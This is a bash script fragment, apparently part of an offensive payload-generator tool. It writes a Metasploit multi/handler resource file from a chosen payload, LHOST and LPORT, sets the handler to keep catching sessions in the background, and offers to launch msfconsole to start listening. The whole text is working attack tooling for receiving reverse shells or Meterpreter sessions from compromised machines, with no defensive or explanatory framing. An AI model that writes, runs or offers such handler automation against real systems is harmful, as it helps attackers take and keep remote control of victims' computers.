HANDLER_PATH="Handlers/${PLATFORM}_${ARCH}_${LPORT}.rc"
echo "use exploit/multi/handler" > $HANDLER_PATH
echo "set PAYLOAD $PAYLOAD" >> $HANDLER_PATH
echo "set LHOST $LHOST" >> $HANDLER_PATH
echo "set LPORT $LPORT" >> $HANDLER_PATH
echo "set ExitOnSession false" >> $HANDLER_PATH
echo "exploit -j -z" >> $HANDLER_PATH

FILESIZE=$(wc -c $HANDLER_PATH |cut -d" " -f1)
if [ "$FILESIZE" -gt 0 ]; then
    echo "[+] Handler Generated Successfuly :D"
    echo "[i] Handler Path : $HANDLER_PATH"
    echo ""
    VALIDSTEP=false
    until [ $VALIDSTEP == true ]
    do
        echo "[i] Start Listening on MSF [Y] "
        echo "[i] Back To Menu           [M] "
        echo "[i] Exit                   [E] "
        echo ""
        Input "[i] Set Your Next Step   : " 
        NextStep=$UserInput

        case $NextStep in
                        Y|y)
                            xterm -e "msfconsole -r $HANDLER_PATH; bash"
                            VALIDSTEP=true 
                        ;;
                        M|m)
                            VALIDSTEP=true
                        ;;
                        E|e)
                            VALIDSTEP=true
                            MENU=false
                        ;;                        
        esac
    done          
else
    echo ""
    echo "[-] Handler not Generated :/"
fi


